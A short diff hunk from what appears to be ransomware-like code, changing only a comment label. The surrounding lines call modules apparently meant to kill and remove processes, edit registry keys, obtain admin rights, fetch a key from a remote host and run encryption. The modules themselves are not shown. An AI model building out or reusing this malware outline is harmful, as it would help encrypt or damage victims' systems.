@@ -18,7 +18,7 @@ dr = delproc.Remove()
 dk = delproc.Kill()
 cp = cpysrc.CopyGui()
 rkey = regedit.ManageKey()
-# MAIN
+# MAIN CODE
 if(get_admin_rights.is_admin()):
     if host_connect.keyrcv():
         keyserver.getcrypt()
